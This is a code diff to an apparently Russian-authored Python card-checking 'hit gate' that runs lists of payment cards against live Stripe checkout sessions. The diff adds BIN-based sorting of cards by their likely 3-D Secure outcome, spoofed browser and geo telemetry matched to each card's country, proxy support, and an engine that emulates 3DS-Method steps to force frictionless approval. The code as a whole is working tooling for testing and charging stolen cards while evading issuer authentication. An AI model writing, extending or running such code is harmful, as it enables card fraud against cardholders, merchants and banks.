@@ -18,6 +18,8 @@ from curl_cffi.requests import AsyncSession
 import config
 import gate_client as gc
 import stripe_fid
+import bin_steering
+import frictionless_engine
 
 sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")
 
@@ -40,6 +42,7 @@ class CsHitSession:
         self.customer_email = ""
         self.customer_name = ""
         self.customer_country = ""
+        self.steering = bin_steering.BinSteeringEngine()
 
     async def open(self) -> tuple[bool, str]:
         d = stripe_fid.decode_fragment(self.url)
@@ -133,15 +136,18 @@ class CsHitSession:
             return {"status": "ERROR", "detail": "сессия не открыта"}
         if self.confirms >= config.MAX_CONFIRMS_PER_SECRET and not await self._alive():
             return {"status": "ERROR", "detail": "confirm-бюджет исчерпан, PI не жив"}
+
+        # 1. 3DS Steering & Geo Enrichment
+        profile = await self.steering.evaluate_card(card_raw)
+        effective_a2 = bin_alpha2 or profile.country_a2 or self.customer_country
+
         telem = gc.stripe_telemetry(self.url, self.pk)
         if self.customer_email:
             telem["email"] = self.customer_email
         if self.customer_name:
             telem["name"] = self.customer_name
-        if self.customer_country and not bin_alpha2:
-            telem.update(gc.geo_identity_fields(self.customer_country))
-        elif bin_alpha2 and bin_alpha2.upper() != (telem.get("country") or "US").upper():
-            telem.update(gc.geo_identity_fields(bin_alpha2))
+        if effective_a2:
+            telem.update(gc.geo_identity_fields(effective_a2))
         card = gc.parse_card(card_raw)
         try:
             r_tok = await self.s.post("https://api.stripe.com/v1/payment_methods",
@@ -153,7 +159,9 @@ class CsHitSession:
         if "id" not in td:
             err = td.get("error", {})
             return {"status": gc.classify_verdict(str(err.get("message", "")) + str(err.get("code", ""))),
-                    "detail": err.get("message", str(td))[:200]}
+                    "detail": err.get("message", str(td))[:200],
+                    "steering_category": profile.category.value,
+                    "confidence": profile.confidence_score}
         body = {
             "key": self.pk,
             "eid": str(uuid.uuid4()),
@@ -204,15 +212,18 @@ class CsHitSession:
                     self.confirms += 1
             except Exception:
                 pass
-        verdict, detail = await self._classify_and_resolve_3ds(resp)
+        verdict, detail = await self._classify_and_resolve_3ds(resp, profile)
         return {"status": verdict, "detail": detail[:250],
-                "amount_cents": self.amount, "currency": self.currency}
+                "amount_cents": self.amount, "currency": self.currency,
+                "steering_category": profile.category.value,
+                "confidence": profile.confidence_score,
+                "reason": profile.reason}
 
-    async def _classify_and_resolve_3ds(self, resp: dict) -> tuple[str, str]:
+    async def _classify_and_resolve_3ds(self, resp: dict, profile: bin_steering.CardProfile | None = None) -> tuple[str, str]:
         """Вердикт по ответу payment_pages/confirm с проходом 3DS-ветки:
         1. Ошибки карточного уровня (402, decline) -> классификация через gate_client
         2. Успех (complete / paid / succeeded) -> APPROVED@PAID
-        3. requires_action -> извлечение next_action -> 3ds2/authenticate или redirect -> 3DS_FRICTIONLESS / 3DS_CHALLENGE."""
+        3. requires_action -> исполнение 3DS-Method + frictionless_engine -> 3DS_FRICTIONLESS / 3DS_CHALLENGE."""
         err = resp.get("error") or {}
         if err:
             code = (str(err.get("code") or "") + " " + str(err.get("decline_code") or "")).strip()
@@ -239,42 +250,23 @@ class CsHitSession:
             if na_type == "use_stripe_sdk":
                 sdk = na.get("use_stripe_sdk") or {}
                 sdk_type = sdk.get("type") or ""
-                source_id = (sdk.get("three_d_secure_2_source")
-                             or sdk.get("source")
-                             or sdk.get("three_d_secure_2"))
                 stripe_js = sdk.get("stripe_js") or {}
                 
-                # Если уже пришёл challenge от ACS (creq / acs_url) -> 3DS_CHALLENGE
+                # Если уже пришёл прямой challenge от ACS (creq / acs_url) -> 3DS_CHALLENGE
                 if sdk_type == "stripe_3ds2_challenge" or "acs_url" in stripe_js:
                     return "3DS_CHALLENGE", "3DS2 challenge required (OTP/SMS)"
-                
-                # Если есть source_id для 3ds2/authenticate
-                if source_id and self.s is not None:
-                    auth_res = await gc.stripe_3ds2_authenticate(self.s, self.pk, source_id)
-                    ts = auth_res.get("transStatus") or ""
-                    state = auth_res.get("state") or ""
-                    
-                    if ts == "Y":
-                        # Frictionless проход: опрашиваем payment_pages на финальный статус
-                        try:
-                            r_poll = await self.s.get(
-                                f"https://api.stripe.com/v1/payment_pages/{self.cs}",
-                                params={"key": self.pk},
-                                headers={"Origin": "https://js.stripe.com",
-                                         "Referer": "https://js.stripe.com/",
-                                         "Accept": "application/json"}, timeout=10)
-                            poll_pi = (r_poll.json() or {}).get("payment_intent") or {}
-                            if poll_pi.get("status") in ("succeeded", "processing"):
-                                return "APPROVED@PAID", f"3DS2 frictionless passed ({self.amount}{self.currency})"
-                        except Exception:
-                            pass
-                        return "3DS_FRICTIONLESS", "3DS2 frictionless (transStatus=Y)"
-                    elif ts == "C":
+
+                # Исполняем Frictionless Engine (3DS-Method iframe emulation + aligned browser telemetry)
+                if self.s is not None:
+                    target_cc = (profile.country_a2 if profile else "") or self.customer_country or "US"
+                    f_res = await frictionless_engine.attempt_frictionless_resolution(
+                        self.s, self.pk, self.cs, sdk, country_code=target_cc
+                    )
+                    outcome = f_res.get("outcome")
+                    if outcome == "FRICTIONLESS_PASSED":
+                        return "APPROVED@PAID", f"3DS2 frictionless passed ({self.amount}{self.currency})"
+                    elif outcome == "CHALLENGE_REQUIRED":
                         return "3DS_CHALLENGE", "3DS2 challenge (transStatus=C, enrolled)"
-                    elif ts in ("N", "R"):
-                        return "DECLINED", f"3DS2 rejected (transStatus={ts})"
-                    elif ts == "A":
-                        return "3DS_CHALLENGE", "3DS2 proof attempted (transStatus=A)"
                 
                 # Fallback по типу SDK
                 if sdk_type in ("stripe_3ds2_fingerprint", "intent_confirmation_challenge"):
@@ -329,7 +321,29 @@ async def main():
     print("[*] STRIPE CHECKOUT /hit GATE (cs_live hosted checkout)")
     print(f"[*] Target: {target.split('#')[0]}")
     print(f"[*] Cards: {len(cards)} | Proxy: {proxy or 'direct'}")
+    
+    # Предварительная оценка и приоритизация пула карт через BinSteeringEngine
+    engine = bin_steering.BinSteeringEngine()
+    queue = await engine.split_queue(cards)
+    print(f"[*] BIN STEERING: {len(queue[bin_steering.ThreeDsCategory.DIRECT_CHECKOUT])} DIRECT_PASS | "
+          f"{len(queue[bin_steering.ThreeDsCategory.FRICTIONLESS_CANDIDATE])} FRICTIONLESS | "
+          f"{len(queue[bin_steering.ThreeDsCategory.CHALLENGE_MANDATORY])} CHALLENGE | "
+          f"{len(queue[bin_steering.ThreeDsCategory.INVALID])} INVALID")
     print("=" * 80)
+
+    # Приоритетный порядок: DIRECT_CHECKOUT -> FRICTIONLESS -> CHALLENGE
+    ordered_cards = []
+    for cat in (bin_steering.ThreeDsCategory.DIRECT_CHECKOUT,
+                bin_steering.ThreeDsCategory.FRICTIONLESS_CANDIDATE,
+                bin_steering.ThreeDsCategory.CHALLENGE_MANDATORY,
+                bin_steering.ThreeDsCategory.INVALID):
+        for p in queue[cat]:
+            for orig in cards:
+                if orig.startswith(p.pan) and orig not in ordered_cards:
+                    ordered_cards.append(orig)
+                    break
+    cards = ordered_cards
+
     gs = CsHitSession(target)
     ok, detail = await gs.open()
     if not ok:
@@ -341,7 +355,8 @@ async def main():
             t0 = time.perf_counter()
             res = await gs.check_card(c)
             lat = int((time.perf_counter() - t0) * 1000)
-            print(f">>> [{res.get('status', '?'):18}] {gc.mask_pan(c)} ({lat}ms) -> {res.get('detail', '')[:120]}", flush=True)
+            steer_tag = f"[{res.get('steering_category', '?')[:6]}]"
+            print(f">>> [{res.get('status', '?'):18}] {steer_tag:8} {gc.mask_pan(c)} ({lat}ms) -> {res.get('detail', '')[:100]}", flush=True)
             if i < len(cards) - 1:
                 await asyncio.sleep(1.5)
     finally:
